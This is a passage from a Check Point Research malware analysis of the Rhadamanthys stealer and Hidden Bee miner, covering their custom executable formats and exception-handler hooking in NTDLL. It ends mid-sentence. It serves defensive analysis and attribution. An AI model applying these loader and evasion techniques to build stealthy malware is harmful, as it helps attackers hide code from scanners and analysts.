<li id="menu-item-29296" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-29296"><a href="https://research.checkpoint.com/category/web3/">Web 3.0 Security</a></li>
<li id="menu-item-26650" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26650"><a href="https://research.checkpoint.com/intelligence-reports/">Intelligence Reports</a></li>
<li id="menu-item-26944" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-26944"><a>Resources</a>
<ul class="sub-menu">
	<li id="menu-item-26940" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26940"><a href="https://www.checkpoint.com/ai/">ThreatCloud AI</a></li>
	<li id="menu-item-26879" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26879"><a target="_blank" rel="noopener" href="https://www.checkpoint.com/solutions/threat-intelligence-research/">Threat Intelligence &#038; Research</a></li>
	<li id="menu-item-26880" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-26880"><a target="_blank" rel="noopener" href="https://www.checkpoint.com/infinity/zero-day-protection/">Zero Day Protection</a></li>
	<li id="menu-item-27006" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-27006"><a href="http://threatemulation.checkpoint.com/">Sandblast File Analysis</a></li>
</ul>
</li>
<li id="menu-item-26639" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26639"><a href="https://research.checkpoint.com/about-us/">About Us</a></li>
<li id="menu-item-26989" class="nav-button menu-item menu-item-type-post_type menu-item-object-page menu-item-26989"><a href="https://research.checkpoint.com/subscription/">SUBSCRIBE</a></li>
</ul></div>						<div class="mobile-view">
							<div class="social-media-wrapper">				
								<div class="social-icons">
																																																					<a href="https://www.linkedin.com/company/check-point-software-technologies/" target="_blank"><svg  style="fill: currentColor;" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve"><g id="XMLID_801_">	<path id="XMLID_802_" d="M72.16,99.73H9.927c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5H72.16c2.762,0,5-2.238,5-5V104.73		C77.16,101.969,74.922,99.73,72.16,99.73z"/>	<path id="XMLID_803_" d="M41.066,0.341C18.422,0.341,0,18.743,0,41.362C0,63.991,18.422,82.4,41.066,82.4		c22.626,0,41.033-18.41,41.033-41.038C82.1,18.743,63.692,0.341,41.066,0.341z"/>	<path id="XMLID_804_" d="M230.454,94.761c-24.995,0-43.472,10.745-54.679,22.954V104.73c0-2.761-2.238-5-5-5h-59.599		c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5h62.097c2.762,0,5-2.238,5-5v-98.918c0-33.333,9.054-46.319,32.29-46.319		c25.306,0,27.317,20.818,27.317,48.034v97.204c0,2.762,2.238,5,5,5H305c2.762,0,5-2.238,5-5V194.995		C310,145.43,300.549,94.761,230.454,94.761z"/></g></svg></a>
																																																							<a href="https://twitter.com/_cpresearch_" target="_blank"><svg  style="fill: currentColor;" version="1.1" id="Layer_1" xmlns="https://www.w3.org/2000/svg" xmlns:xlink="https://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve"><g id="XMLID_826_"> <path id="XMLID_827_" d="M302.973,57.388c-4.87,2.16-9.877,3.983-14.993,5.463c6.057-6.85,10.675-14.91,13.494-23.73	c0.632-1.977-0.023-4.141-1.648-5.434c-1.623-1.294-3.878-1.449-5.665-0.39c-10.865,6.444-22.587,11.075-34.878,13.783	c-12.381-12.098-29.197-18.983-46.581-18.983c-36.695,0-66.549,29.853-66.549,66.547c0,2.89,0.183,5.764,0.545,8.598	C101.163,99.244,58.83,76.863,29.76,41.204c-1.036-1.271-2.632-1.956-4.266-1.825c-1.635,0.128-3.104,1.05-3.93,2.467	c-5.896,10.117-9.013,21.688-9.013,33.461c0,16.035,5.725,31.249,15.838,43.137c-3.075-1.065-6.059-2.396-8.907-3.977	c-1.529-0.851-3.395-0.838-4.914,0.033c-1.52,0.871-2.473,2.473-2.513,4.224c-0.007,0.295-0.007,0.59-0.007,0.889	c0,23.935,12.882,45.484,32.577,57.229c-1.692-0.169-3.383-0.414-5.063-0.735c-1.732-0.331-3.513,0.276-4.681,1.597	c-1.17,1.32-1.557,3.16-1.018,4.84c7.29,22.76,26.059,39.501,48.749,44.605c-18.819,11.787-40.34,17.961-62.932,17.961	c-4.714,0-9.455-0.277-14.095-0.826c-2.305-0.274-4.509,1.087-5.294,3.279c-0.785,2.193,0.047,4.638,2.008,5.895	c29.023,18.609,62.582,28.445,97.047,28.445c67.754,0,110.139-31.95,133.764-58.753c29.46-33.421,46.356-77.658,46.356-121.367	c0-1.826-0.028-3.67-0.084-5.508c11.623-8.757,21.63-19.355,29.773-31.536c1.237-1.85,1.103-4.295-0.33-5.998	C307.394,57.037,305.009,56.486,302.973,57.388z"/></g></svg></a>
																																																							<a href="https://www.facebook.com/checkpointresearch/" target="_blank"><svg style="fill: currentColor;" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve"><path id="XMLID_835_" d="M81.703,165.106h33.981V305c0,2.762,2.238,5,5,5h57.616c2.762,0,5-2.238,5-5V165.765h39.064		c2.54,0,4.677-1.906,4.967-4.429l5.933-51.502c0.163-1.417-0.286-2.836-1.234-3.899c-0.949-1.064-2.307-1.673-3.732-1.673h-44.996		V71.978c0-9.732,5.24-14.667,15.576-14.667c1.473,0,29.42,0,29.42,0c2.762,0,5-2.239,5-5V5.037c0-2.762-2.238-5-5-5h-40.545		C187.467,0.023,186.832,0,185.896,0c-7.035,0-31.488,1.381-50.804,19.151c-21.402,19.692-18.427,43.27-17.716,47.358v37.752H81.703		c-2.762,0-5,2.238-5,5v50.844C76.703,162.867,78.941,165.106,81.703,165.106z"/></svg></a>
																																						</div>	
								<button class="button background-skyblue font-white skyblue-border" onclick="openPopup('subscribe-us-popup')">SUBSCRIBE</button>
							</div>
						</div>
					</div>
									</div>
				
				<div class="nav-search-wrapper">
					<div role="search--" method="get--" id="searchform" class="searchform inc-search" action="">
						<input type="text" value="" name="s" id="s" placeholder="SEARCH"/>
						
						<button type="submit--" id="searchsubmit">
							<svg xmlns="http://www.w3.org/2000/svg" width="22.225" height="21.19" viewBox="0 0 22.225 21.19">
							  <path id="search_left-_1504_" data-name="search_left-[#1504]" d="M264,138.586,262.515,140l-4.455-4.242,1.485-1.415ZM251.4,134a6.007,6.007,0,1,1,6.3-6,6.162,6.162,0,0,1-6.3,6Zm0-14a8.01,8.01,0,1,0,8.4,8,8.208,8.208,0,0,0-8.4-8Z" transform="translate(-242.5 -119.5)" fill="#202020" stroke="#cbcbcb" stroke-width="1" fill-rule="evenodd"/>
							</svg>
						</button>
			
					</div>
				</div>
			</div>
		</div>
	</div>
</nav><header class="site-header">
		<!---div class="header-title-inner-page">
		<div class="container">
			<h1></h1>
		</div>
	</div--->
		
</header> 

<style type="text/css"> .blog-post-wrap h1.h3{color:white; font-size:1.4rem} .wp-block-image figcaption {text-align:center;} .wp-block-heading{color:#FFF;} strong { font-weight: bold; color:white;} .wp-block-table thead{border-bottom:4px solid #656597} p, ul li, ol li, .text, .text a {color:#ddd} .blog-post-wrapper.single-blog-wrapper .text p, .blog-post-wrapper.single-blog-wrapper .text li, .blog-post-wrapper.single-blog-wrapper .text p a {color:#ddd} .wp-block-table td, .wp-block-table th { border:2px solid #656597;} .blog-post-wrapper.single-blog-wrapper .text p a, .text a { color: #748ad8; } code {  background: #ad2963;  word-wrap: break-word; padding: 0rem 0.2rem 0rem;  border-radius: 0.2rem; } </style> 

<div class="container container-wide">
	<div class="mobile-categories-nav">
		<div class="sidebar-post-categories">
	<div class="text font-blue">
			<h2>CATEGORIES</h2>
		</div>
					<ul class="post-category">
			 
			<li> 
				<a href="https://research.checkpoint.com/category/android-malware/" onclick="location.href = 'https://research.checkpoint.com/category/android-malware/';">
					<input type="checkbox" id="10457" class="cat-filter" value="10457">
					<label for="10457"> Android Malware</label>
					<span>23</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/artificial-intelligence-2/" onclick="location.href = 'https://research.checkpoint.com/category/artificial-intelligence-2/';">
					<input type="checkbox" id="10621" class="cat-filter" value="10621">
					<label for="10621"> Artificial Intelligence</label>
					<span>4</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/chatgpt/" onclick="location.href = 'https://research.checkpoint.com/category/chatgpt/';">
					<input type="checkbox" id="10637" class="cat-filter" value="10637">
					<label for="10637"> ChatGPT</label>
					<span>3</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-research/" onclick="location.href = 'https://research.checkpoint.com/category/threat-research/';">
					<input type="checkbox" id="10441" class="cat-filter" value="10441">
					<label for="10441"> Check Point Research Publications</label>
					<span>388</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/cloud-security/" onclick="location.href = 'https://research.checkpoint.com/category/cloud-security/';">
					<input type="checkbox" id="10634" class="cat-filter" value="10634">
					<label for="10634"> Cloud Security</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/cpradio/" onclick="location.href = 'https://research.checkpoint.com/category/cpradio/';">
					<input type="checkbox" id="10539" class="cat-filter" value="10539">
					<label for="10539"> CPRadio</label>
					<span>44</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/crypto/" onclick="location.href = 'https://research.checkpoint.com/category/crypto/';">
					<input type="checkbox" id="10655" class="cat-filter" value="10655">
					<label for="10655"> Crypto</label>
					<span>2</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/data-threat-intelligence/" onclick="location.href = 'https://research.checkpoint.com/category/data-threat-intelligence/';">
					<input type="checkbox" id="10643" class="cat-filter" value="10643">
					<label for="10643"> Data &amp; Threat Intelligence</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/data-analysis/" onclick="location.href = 'https://research.checkpoint.com/category/data-analysis/';">
					<input type="checkbox" id="10645" class="cat-filter" value="10645">
					<label for="10645"> Data Analysis</label>
					<span>0</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/demos/" onclick="location.href = 'https://research.checkpoint.com/category/demos/';">
					<input type="checkbox" id="10062" class="cat-filter" value="10062">
					<label for="10062"> Demos</label>
					<span>22</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-intelligence-reports/" onclick="location.href = 'https://research.checkpoint.com/category/threat-intelligence-reports/';">
					<input type="checkbox" id="10060" class="cat-filter" value="10060">
					<label for="10060"> Global Cyber Attack Reports</label>
					<span>326</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/how-to-guides/" onclick="location.href = 'https://research.checkpoint.com/category/how-to-guides/';">
					<input type="checkbox" id="10475" class="cat-filter" value="10475">
					<label for="10475"> How To Guides</label>
					<span>12</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/ransomware/" onclick="location.href = 'https://research.checkpoint.com/category/ransomware/';">
					<input type="checkbox" id="10622" class="cat-filter" value="10622">
					<label for="10622"> Ransomware</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/russo-ukrainian-war/" onclick="location.href = 'https://research.checkpoint.com/category/russo-ukrainian-war/';">
					<input type="checkbox" id="10624" class="cat-filter" value="10624">
					<label for="10624"> Russo-Ukrainian War</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/security-report/" onclick="location.href = 'https://research.checkpoint.com/category/security-report/';">
					<input type="checkbox" id="10656" class="cat-filter" value="10656">
					<label for="10656"> Security Report</label>
					<span>1</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-and-data-analysis/" onclick="location.href = 'https://research.checkpoint.com/category/threat-and-data-analysis/';">
					<input type="checkbox" id="10644" class="cat-filter" value="10644">
					<label for="10644"> Threat and data analysis</label>
					<span>0</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/threat-research-2/" onclick="location.href = 'https://research.checkpoint.com/category/threat-research-2/';">
					<input type="checkbox" id="10458" class="cat-filter" value="10458">
					<label for="10458"> Threat Research</label>
					<span>172</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/web3/" onclick="location.href = 'https://research.checkpoint.com/category/web3/';">
					<input type="checkbox" id="10653" class="cat-filter" value="10653">
					<label for="10653"> Web 3.0 Security</label>
					<span>9</span>
				</a>	
			</li>
			 
			<li> 
				<a href="https://research.checkpoint.com/category/wipers/" onclick="location.href = 'https://research.checkpoint.com/category/wipers/';">
					<input type="checkbox" id="10623" class="cat-filter" value="10623">
					<label for="10623"> Wipers</label>
					<span>0</span>
				</a>	
			</li>
					</ul>
		</div>

	</div>
</div>
<section id="single-post" class="blog-post-wrapper single-blog-wrapper section-padding background-blue ">
	<div class="container container-wide">
		
		<div class="flex-row align-items-start">
			<div class="flex-8 font-white">
				<div class="blog-post-wrap">
					<div class="flex-row">
						<div class="flex-12">
														<div class="image">
								<img src="https://research.checkpoint.com/wp-content/uploads/2023/08/Rhadamanthys-Cover-1.png" alt=""/>
							</div>
													</div>
						<div class="flex-9">
							<div class="text">
								<h1 class="h3">From Hidden Bee to Rhadamanthys &#8211; The Evolution of Custom Executable Formats</h1>
								<div class="date">
									<svg xmlns="http://www.w3.org/2000/svg" width="14.012" height="14.012" viewBox="0 0 14.012 14.012"><path id="Path_149" data-name="Path 149" d="M1.752,4.379v7.882H12.261V4.379Zm9.634-2.627h1.752a.827.827,0,0,1,.876.876V13.137a.827.827,0,0,1-.876.876H.876A.827.827,0,0,1,0,13.137V2.627a.827.827,0,0,1,.876-.876H2.627V.876A.827.827,0,0,1,3.5,0a.827.827,0,0,1,.876.876v.876H9.634V.876a.876.876,0,1,1,1.752,0Zm-.876,8.758H8.758V8.758h1.752Zm-2.627,0H6.13V8.758H7.882Zm2.627-2.627H8.758V6.13h1.752Zm-2.627,0H6.13V6.13H7.882ZM5.255,10.509H3.5V8.758H5.255Z" fill="#fff" fill-rule="evenodd"/></svg>									
									August 31, 2023								</div>
							</div>
						</div>
						<div class="flex-3">
							<div class="social-button">
		<div class="icon-sharing-links">
			<a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/ -  https://research.checkpoint.com/?p=28583;source=LinkedIn" title="Share on LinkedIn!" ><svg style="fill: currentColor;" id="Group_185773" data-name="Group 185773" xmlns="http://www.w3.org/2000/svg" width="15.863" height="15.697" viewBox="0 0 15.863 15.697"><path id="Path_28" data-name="Path 28" d="M41.342,107.835H38.107V97.622c2.039-.532,2.921-.341,3.249.629a10.413,10.413,0,0,1,2.275-1.038c2.6-.5,4.128.657,4.565,3.306a7.793,7.793,0,0,1,.128,1.212c.014,1.986.006,3.973.006,6.07H45.04c0-1.073,0-2.147,0-3.22,0-.724.016-1.449-.015-2.173-.075-1.7-.606-2.4-1.771-2.4-1.211.006-1.861.8-1.9,2.469C41.31,104.241,41.342,106,41.342,107.835Z" transform="translate(-32.47 -92.138)" fill="currentColor"/><path id="Path_29" data-name="Path 29" d="M31.482,97.555h3.156v10.359H31.482Z" transform="translate(-31.164 -92.228)" fill="currentColor"/> <path id="Path_30" data-name="Path 30" d="M32.993,94.694a1.862,1.862,0,0,1-1.907-1.862,1.891,1.891,0,0,1,1.88-1.912,1.867,1.867,0,0,1,1.889,1.885A1.816,1.816,0,0,1,32.993,94.694Z" transform="translate(-31.086 -90.92)" fill="currentColor"/></svg></a>
			
			<a target="blank" href="http://www.facebook.com/sharer.php?u=https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/ - https://research.checkpoint.com/?p=28583 "title="Share on Facebook!"><svg style="fill: currentColor;"  id="WKND-icon" xmlns="http://www.w3.org/2000/svg" width="14.347" height="14.347" viewBox="0 0 14.347 14.347"><rect id="background" width="14.347" height="14.347" transform="translate(0 0)" fill="transparent"/><g id="Dribbble-Light-Preview" transform="translate(3.966 0.077)"><g id="icons"><path id="facebook-_176_" data-name="facebook-[#176]" d="M333.867,7253.27v-6.422h1.95l.318-2.854h-2.268V7242.6c0-.735.019-1.465,1.046-1.465h1.04V7239.1a11.584,11.584,0,0,0-1.8-.1c-1.888,0-3.07,1.183-3.07,3.354v1.641H329v2.854h2.086v6.422Z" transform="translate(-329 -7239)" fill="currentColor" fill-rule="evenodd"/> </g></g></svg></a>
			
			<a target="blank" href="http://twitter.com/home/?status=From Hidden Bee to Rhadamanthys &#8211; The Evolution of Custom Executable Formats - https://research.checkpoint.com/?p=28583 via @kenmata "title="Tweet this!"><svg style="fill: currentColor;"  id="WKND-icon" xmlns="http://www.w3.org/2000/svg" width="14.515" height="14.347" viewBox="0 0 14.515 14.347"><rect id="background" width="14.347" height="14.347" transform="translate(0 0)" fill="transparent"/><g id="Dribbble-Light-Preview" transform="translate(0.245 1.504)"><g id="icons"><path id="twitter-_154_" data-name="twitter-[#154]" d="M8.488,7372.416a8.206,8.206,0,0,0,8.33-8.2c0-.125,0-.25-.009-.373a5.9,5.9,0,0,0,1.461-1.492,5.926,5.926,0,0,1-1.681.453,2.9,2.9,0,0,0,1.287-1.595,5.9,5.9,0,0,1-1.859.7,2.964,2.964,0,0,0-4.143-.125,2.858,2.858,0,0,0-.847,2.754,8.364,8.364,0,0,1-6.034-3.011,2.857,2.857,0,0,0,.907,3.847,2.942,2.942,0,0,1-1.329-.36v.036a2.9,2.9,0,0,0,2.349,2.825,2.954,2.954,0,0,1-1.321.049,2.924,2.924,0,0,0,2.735,2,5.929,5.929,0,0,1-3.636,1.236,5.847,5.847,0,0,1-.7-.041,8.379,8.379,0,0,0,4.488,1.292" transform="translate(-4 -7361)" fill="currentColor" fill-rule="evenodd"/></g></g></svg></a>
		
			<a onclick="copyToClipboard('#28583')"  title="Copy this!"><svg style="fill: currentColor;"  xmlns="http://www.w3.org/2000/svg" width="18.7" height="18.7" viewBox="0 0 18.7 18.7"><g id="Group_185774" data-name="Group 185774" transform="translate(-591.15 -798.097)"><g id="copy" transform="translate(592 798.947)"><rect id="Rectangle_147602" data-name="Rectangle 147602" width="11" height="11" rx="2" transform="translate(6 6)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.7"/><path id="Path_83125" data-name="Path 83125" d="M4.542,13.016H3.695A1.7,1.7,0,0,1,2,11.321V3.695A1.7,1.7,0,0,1,3.695,2h7.626a1.7,1.7,0,0,1,1.695,1.695v.847" transform="translate(-2 -2)" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.7"/></g></g></svg></a>
			<div id="28583"  style="display: none;"/>https://research.checkpoint.com/2023/from-hidden-bee-to-rhadamanthys-the-evolution-of-custom-executable-formats/</div>
		
		</div>
		<div class="icon-sharing"></div>	
</div>						</div>
					</div>
										
					<div class="text border-bottom">
						
<p><strong>Research by:</strong> hasherezade</p>



<h2 class="wp-block-heading" id="highlights">Highlights</h2>



<ul class="wp-block-list">
<li><em><strong>Rhadamanthys stealer’s design and implementation significantly overlap with those of Hidden Bee coin miner. The similarity is apparent at many levels: custom executable formats, the use of similar virtual filesystems, identical paths to some of the components, reused functions, similar use of steganography, use of LUA scripts, and overall analogous design.</strong></em></li>



<li><em><strong>Check Point Research (CPR) highlights and provides a technical analysis of some of those similarities, with a special focus on the custom executable formats. We present details of RS, HS, and the latest XS executable formats used by this malware.</strong></em></li>



<li><em><strong>We explain implementation details, i.e.&nbsp;the inner workings of the identical homebrew exception handling used for custom modules in both Rhadamanthys and Hidden Bee.</strong></em></li>



<li><em><strong>Basing on the Hidden Bee format converters, we provide a tool allowing to reconstruct PEs from the Rhadamanthys custom formats in order to aid analysis.</strong></em></li>



<li><em><strong>We give an overview of particular stages and involved modules.</strong></em></li>
</ul>



<h2 class="wp-block-heading" id="introduction"><strong>Introduction</strong></h2>



<p>Rhadamanthys is a relatively new stealer that continues to evolve and gain in popularity. The earliest mention was in a black market advertisement in September 2022. The stealer immediately caught the attention of buyers as well as researchers due to its very rich feature set and its well-polished, multi-staged design. The malware seller, using the handle King Crete (kingcrete2022), and writing mostly in Russian, came across as very professional. Although malware sellers are not necessarily the original authors, the way King Crete responded to questions suggested an in-depth knowledge of the code, sparking curiosity and speculation on what other malware he may have authored (For more on the background and distribution of Rhadamanthys, see&nbsp;<a href="https://research.checkpoint.com/2023/rhadamanthys-the-everything-bagel-infostealer/">our previous article</a>). The development of the malware is fast-paced and ongoing. The advertisement process is not stagnant either, with updates published i.e.&nbsp;on a Tor-based website. The latest advertised version up to date is 0.4.9 (Figure 1).</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId23.png" alt="Figure 1: The author advertises the latest version: 0.4.9, over the
Telegram account"/><figcaption class="wp-element-caption">Figure 1: The author advertises the latest version: 0.4.9, over the Telegram account</figcaption></figure>



<p>In addition to the rich set of stealing features, Rhadamanthys comes with some obfuscation ideas that are pretty niche. While the initial loader is a typical Windows PE, most of the core modules are delivered in the form of custom executable formats. The seller’s advertisement describes this feature in vague terms, which provide assurance about the quality without giving any hints about the implementation. As it says in the ad, “<em>all functional operations are executed in memory, no disk packing operations, with the Loader that can execute loading in memory, it can perfectly realize memory loading operations</em>” (Figure 2).</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId26.png" alt="Figure 2: Advertisement from one of the forums describing the
Rhadamanthys stealer’s capabilities"/><figcaption class="wp-element-caption">Figure 2: Advertisement from one of the forums describing the Rhadamanthys stealer’s capabilities</figcaption></figure>



<p>Multiple researchers (i.e., from Kaspersky[<a href="https://twitter.com/kaspersky/status/1667018902549692416">2</a>][<a href="https://securelist.com/crimeware-report-uncommon-infection-methods-2/109522/">3</a>], ZScaller[<a href="https://www.zscaler.com/blogs/security-research/technical-analysis-rhadamanthys-obfuscation-techniques">4</a>]) quickly noticed the similarities between the formats used by Rhadamanthys and the ones belonging to Hidden Bee, which is another complex malware consisting of multiple stages. Hidden Bee first appeared&nbsp;<a href="https://www.malwarebytes.com/blog/news/2018/07/hidden-bee-miner-delivered-via-improved-drive-by-download-toolkit">around 2018</a>, and its final payload was a coin miner implemented by&nbsp;<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">LUA scripts</a>. Its main distribution channel used to be an Underminer Exploit Kit. Initially, it seemed that a lot of effort was put into the malware development. However, as time went by, it became more and more rare to find new samples. The last ones were&nbsp;<a href="https://twitter.com/AvastThreatLabs/status/1435335676002635776?s=20">observed in 2021</a>. It is possible that the mining business no longer proved as profitable to the authors, so they decided to repurpose the code and began selling it to distributors.</p>



<p>In this report, we review the custom formats used by both malware families and highlight their similarities. We present arguments supporting the theory that Rhadamanthys is a continuation of the work started as Hidden Bee.</p>



<p>We also offer converters that can reconstruct PE files from the custom formats, which enabled us to circumvent some of the problems other researchers noted while analyzing this malware and quickly reach the core of the stealer’s logic.</p>



<p>In the first part of the article, we show the Rhadamanthys execution chain, provide details about the formats and PE reconstruction, and compare their similarities with the Hidden Bee. In the second part, we show the code logic and how the stealer functionality is deployed.</p>



<p><em>NOTE: For the sake of readability, we use a convention that light mode IDA screenshots are related to Hidden Bee, while dark mode to Rhadamanthys.</em></p>



<h2 class="wp-block-heading" id="the-joy-of-custom-formats">The joy of custom formats</h2>



<p>The use of customized executable formats in malware loaders is not something new. It is a form of obfuscation, making it more difficult for memory scanners to detect the loaded sample, as well as presents an additional obstacle for researchers during the analysis process. While most malware authors stick to writing custom PE loaders, some go further and modify selected parts of the format by their own creativity. Even more rare are components where the customization is advanced enough to make it a completely different format that has little or no resemblance to the PE.</p>



<p>The analysis of this phenomenon was described in&nbsp;<a href="https://speakerdeck.com/hshrzd/funky-malware-formats">the session “Funky malware formats”</a>, presented at&nbsp;<a href="https://thesascon.com">SAS</a>&nbsp;2019. One of the mentioned examples was a format used by Hidden Bee. However, the set of custom formats that this malware offered over time is very rich, and not all of them have been covered in the talk.</p>



<p>Below, we will highlight two of the Hidden Bee formats that have the most in common with the ones used nowadays by Rhadamanthys. They will become a base for further comparison.</p>



<h2 class="wp-block-heading" id="hidden-bee-formats-ne-and-ns">Hidden Bee formats: NE and NS</h2>



<p>In&nbsp;<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">a Malwarebytes article from 2018,</a>&nbsp;two Hidden Bee formats have been mentioned: NE and NS, as well as their loading process. As we show later on, both of those formats share elements with the ones used by Rhadamanthys. In the NE format loader, we found some functions that also occur almost unchanged in the current malware’s components. The NS format is even more noteworthy as it is a direct predecessor of the formats used by Rhadamanthys.</p>



<h3 class="wp-block-heading" id="the-ne-format">The NE format</h3>



<p>NE is the simpler of the two mentioned formats, more closely resembling PE. The custom header is a replacement for the DOS header:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">WORD magic; // 'NE'
WORD pe_offset;
WORD machine_id;</pre>



<p>The rest of the headers are identical to PE, and only the “PE” magic identifier was erased.</p>



<p>As mentioned in the article [<a href="https://www.malwarebytes.com/blog/news/2019/05/hidden-bee-lets-go-down-the-rabbit-hole">8</a>] “<em>The conversion back to PE format is trivial: It is enough to add the erased magic numbers: MZ and PE, and to move displaced fields to their original offsets. The tool that automatically does the mentioned conversion is available&nbsp;<a href="https://github.com/hasherezade/bee_parser/tree/master/bee_lvl2_converter">here</a>.</em>”</p>



<p>While the NE format by itself is not particularly interesting, by looking inside the converted application, we can see some functions almost identical to the ones found in Rhadamanthys.</p>



<h4 class="wp-block-heading" id="handling-exceptions-from-a-custom-module">Handling exceptions from a custom module</h4>



<p>Custom loading some crucial fragments of the PE structure, such as imports and relocations, is relatively easy, but problems can occur if we want to convert a PE file with an exception table. Imagine that some of the code of our implant has try-catch blocks inside. The&nbsp;<code>try</code>&nbsp;block may cause an exception to be thrown, and the&nbsp;<code>catch</code>&nbsp;block is where they are normally handled. The list of those handlers is stored in the Exception Table, which is one of the Data Directories within a PE. If, for any reason, the proper handler is not found, the corresponding exception causes the application to crash. (For a more detailed explanation, reference&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/debug/structured-exception-handling">Microsoft’s documentation</a>). Interestingly, although there are many malware families that use custom loaders, they usually don’t address this part of the PE format. However, Hidden Bee, as well as its successor Rhadamanthys, don’t shy away from it.</p>



<p>Let’s look into the main function where the NE module execution starts &#8211; first, a 64-bit example:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId41.png" alt="Figure 3: Main function of the module in NE format, 64-bit"/><figcaption class="wp-element-caption">Figure 3: Main function of the module in NE format, 64-bit</figcaption></figure></div>


<p>The first step is a simple verification of the NE magic. When the check passes, the module initializes its exception directory (using the function denoted as&nbsp;<code>add_dynamic_seh_handlers</code>).</p>



<p>Next, the error mode is being set to&nbsp;<code>0x8003</code>&nbsp;-&gt;&nbsp;<code><a href="https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-seterrormode">SEM_NOOPENFILEERRORBOX | SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS</a></code>. That means all error messages are muted, most likely to ensure stealth, just in case some of the exceptions within the module would not be handled properly.</p>



<p>The function denoted as&nbsp;<code>add_dynamic_seh_handlers</code>&nbsp;shows how the exception handling for a custom module can be implemented for a 64-bit application:</p>



<figure class="wp-block-image aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId44.png" alt="Figure 4: A function registering custom exception handlers,
64-bit"/><figcaption class="wp-element-caption">Figure 4: A function registering custom exception handlers, 64-bit</figcaption></figure>



<p>The solution looks fairly easy: the exceptions table is fetched from the module and then initialized by the Windows API function&nbsp;<code><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtladdfunctiontable">RtlAddFunctionTable</a></code>. Thanks to this, whenever the exception is thrown from within the custom module, an appropriate handler will be found and executed.</p>



<p>However, the mentioned API function can be used only for 64-bit binaries and has no 32-bit equivalent. So, how do we manage an analogous situation for a 32-bit module? Let’s have a look at the 32-bit version of the NE module:</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="https://research.checkpoint.com/wp-content/uploads/2023/08/8KWUXSRRQF-rId47.png" alt="Figure 5: Main function of the module in NE format, 32-bit"/><figcaption class="wp-element-caption">Figure 5: Main function of the module in NE format, 32-bit</figcaption></figure></div>


<p>In this case, the author goes another approach by hooking the exception dispatcher (<code>KiUserExceptionDispatcher</code>) within the NTDLL. More precisely, a call to&nbsp;<code>ZwQueryInformationProcess</code>&nbsp;within the&nbsp;<code>RtlDispatchException</code>&nbsp;is redirected to a proxy function. As we will see, the same trick is used by Rhadamanthys.</p>



<p>The original call to&nbsp;<code>ZwQueryInformationProcess</code>&nbsp;within NTDLL is replaced:</p>



